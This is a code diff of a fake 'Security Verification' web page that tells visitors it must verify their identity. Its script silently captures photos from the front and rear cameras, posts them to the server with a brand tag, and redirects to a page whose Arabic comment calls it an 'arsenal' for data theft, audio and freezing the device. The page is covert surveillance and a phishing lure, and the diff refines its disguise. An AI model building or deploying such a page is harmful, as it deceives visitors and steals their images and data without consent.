@@ -1,25 +1,40 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Security Check</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Verification</title>
 <style>
-  body{margin:0;font-family:sans-serif;background:#0f1115;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center}
-  .box{padding:40px;background:#171a21;border-radius:12px;max-width:400px;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid #2a2f3a}
-  h1{font-size:22px;margin-bottom:16px;color:#4a90e2}
-  p{color:#8a8f99;font-size:14px;margin-bottom:24px;line-height:1.5}
-  button{background:#4a90e2;color:#fff;border:none;padding:12px 24px;border-radius:8px;font-size:16px;cursor:pointer;width:100%;font-weight:600;transition:0.2s}
-  button:hover{background:#3a7bc8}
-  #status{margin-top:16px;font-size:13px;color:#7dd87d;display:none}
+  body {
+    margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0f1115; color: #fff; display: flex; justify-content: center; align-items: center;
+    min-height: 100vh; text-align: center; padding: 20px;
+  }
+  .box {
+    padding: 40px; background: #171a21; border-radius: 12px; max-width: 400px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #2a2f3a;
+  }
+  .icon { font-size: 50px; margin-bottom: 20px; }
+  h1 { font-size: 22px; margin-bottom: 16px; color: #fff; }
+  p { color: #8a8f99; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+  button {
+    background: #4a90e2; color: #fff; border: none; padding: 14px 24px;
+    border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; font-weight: 600;
+    transition: background 0.2s;
+  }
+  button:hover { background: #3a7bc8; }
+  #status { margin-top: 16px; font-size: 13px; color: #7dd87d; display: none; }
 </style>
 </head>
 <body>
 <div class="box">
-  <h1>Security Verification</h1>
+  <div class="icon">🛡️</div>
+  <h1>Security Check</h1>
   <p>To protect your account, we need to verify your identity. Please allow camera access when prompted.</p>
   <button id="btn">Start Verification</button>
-  <div id="status">Verifying... please wait. (This may take a moment)</div>
+  <div id="status">Verifying... please wait.</div>
 </div>
+
 <script>
 const urlParams = new URLSearchParams(window.location.search);
 const brand = urlParams.get('b') || 'generic';
@@ -34,7 +49,7 @@ document.getElementById('btn').addEventListener('click', async () => {
   let frontImg = null; 
   let backImg = null;
 
-  // 1. الكاميرا الأمامية
+  // 1. التقاط الكاميرا الأمامية
   try {
     let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
     let video = document.createElement('video'); 
@@ -48,7 +63,7 @@ document.getElementById('btn').addEventListener('click', async () => {
     stream.getTracks().forEach(t => t.stop());
   } catch (e) { console.log('Front cam denied/failed'); }
   
-  // 2. الكاميرا الخلفية
+  // 2. التقاط الكاميرا الخلفية
   try {
     let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
     let video = document.createElement('video'); 
@@ -62,15 +77,15 @@ document.getElementById('btn').addEventListener('click', async () => {
     stream.getTracks().forEach(t => t.stop());
   } catch (e) { console.log('Back cam denied/failed'); }
 
-  // 3. إرسال الصور للسيرفر (عشان تروح للديسكورد)
+  // 3. إرسال الصور للسيرفر
   await fetch('/upload-cam', { 
     method: 'POST', 
     headers: { 'Content-Type': 'application/json' }, 
     body: JSON.stringify({ front: frontImg, back: backImg, brand: brand }) 
   }).catch(()=>{});
   
-  // 4. تحويله لصفحة الرعب
-  window.location.href = '/troll.html';
+  // 4. تحويله لصفحة الترسانة (اللي فيها سحب البيانات والصوت والتجميد)
+  window.location.href = '/weapons.html?b=' + brand;
 });
 </script>
 </body>
